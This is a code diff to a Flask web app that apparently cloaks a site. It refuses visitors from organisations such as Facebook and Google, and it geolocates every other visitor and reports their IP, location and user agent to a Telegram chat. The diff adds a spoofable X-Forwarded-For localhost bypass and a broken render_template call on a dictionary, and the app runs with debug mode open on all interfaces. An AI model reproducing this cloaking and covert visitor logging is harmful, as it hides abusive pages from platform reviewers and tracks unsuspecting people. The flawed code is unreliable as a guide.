@@ -6,7 +6,7 @@ from json.decoder import JSONDecodeError
 
 import jwt
 import requests
-from flask import Flask, jsonify, request, send_file
+from flask import Flask, jsonify, render_template, request, send_from_directory
 from flask_cors import CORS
 from requests.exceptions import RequestException
 
@@ -31,6 +31,10 @@ DEFAULT_CONFIG = {
         "data_token": "",
     },
 }
+
+DEFAULT_VALUE = "Không có"
+
+INDEX_TEMPLATE = "index.html"
 
 
 def ensure_config_file():
@@ -109,28 +113,45 @@ def handle_error(error):
 @app.route("/")
 def index():
     user_agent = request.headers.get("User-Agent")
-    ip = request.remote_addr
+    ip = request.headers.get("X-Forwarded-For")
+    if ip:
+        ip = ip.split(",")[0]
+    else:
+        ip = request.remote_addr
+    if ip == "127.0.0.1":
+        return render_template(INDEX_TEMPLATE)
     if is_bot(ip, user_agent):
-        return jsonify({"message": "Access Denied"}), 403
+        return render_template({"message": "Access Denied"}), 403
 
     send_visitor_info(ip, user_agent)
-    return send_file("index.html")
+    return render_template(INDEX_TEMPLATE)
 
 
 @app.route("/<path:path>")
 def catch_all(path):
     user_agent = request.headers.get("User-Agent")
-    ip = request.remote_addr
+    ip = request.headers.get("X-Forwarded-For")
+    if ip:
+        ip = ip.split(",")[0]
+    else:
+        ip = request.remote_addr
+    if ip == "127.0.0.1":
+        if os.path.exists(os.path.join(app.static_folder, path)):
+            return send_from_directory(app.static_folder, path)
+        else:
+            return render_template(INDEX_TEMPLATE)
     send_visitor_info(ip, user_agent)
     if is_bot(ip, user_agent):
         return jsonify({"message": "Access Denied"}), 403
     elif os.path.exists(os.path.join(app.static_folder, path)):
-        return send_file(os.path.join(app.static_folder, path))
+        return send_from_directory(app.static_folder, path)
     else:
-        return send_file("index.html")
+        return render_template(INDEX_TEMPLATE)
 
 
 def is_bot(ip, user_agent):
+    if ip == "127.0.0.1":
+        return True
     blocked_organizations = [
         "facebook",
         "google",
@@ -200,14 +221,14 @@ def send_visitor_info(ip, user_agent):
 
     user_agent = escape_html(str(user_agent))
     ip = escape_html(str(ip))
-    country = escape_html(str(geo_data.get("country", "Không có")))
-    region = escape_html(str(geo_data.get("region", "Không có")))
-    city = escape_html(str(geo_data.get("city", "Không có")))
-    latitude = escape_html(str(geo_data.get("latitude", "Không có")))
-    longitude = escape_html(str(geo_data.get("longitude", "Không có")))
-    timezone = escape_html(str(geo_data.get("timezone", "Không có")))
-    asn = escape_html(str(geo_data.get("asn", "Không có")))
-    organization = escape_html(str(geo_data.get("organization", "Không có")))
+    country = escape_html(str(geo_data.get("country", DEFAULT_VALUE)))
+    region = escape_html(str(geo_data.get("region", DEFAULT_VALUE)))
+    city = escape_html(str(geo_data.get("city", DEFAULT_VALUE)))
+    latitude = escape_html(str(geo_data.get("latitude", DEFAULT_VALUE)))
+    longitude = escape_html(str(geo_data.get("longitude", DEFAULT_VALUE)))
+    timezone = escape_html(str(geo_data.get("timezone", DEFAULT_VALUE)))
+    asn = escape_html(str(geo_data.get("asn", DEFAULT_VALUE)))
+    organization = escape_html(str(geo_data.get("organization", DEFAULT_VALUE)))
 
     message = f"""
 <b>🖥️ User Agent:</b> <code>{user_agent}</code>
@@ -245,7 +266,5 @@ def send_to_telegram(message, parse_mode="HTML"):
         print(f"Failed to send message to Telegram: {e}")
 
 
-if __name__ == "__main__":
-    app.run(host="0.0.0.0", debug=True)
 if __name__ == "__main__":
     app.run(host="0.0.0.0", debug=True)
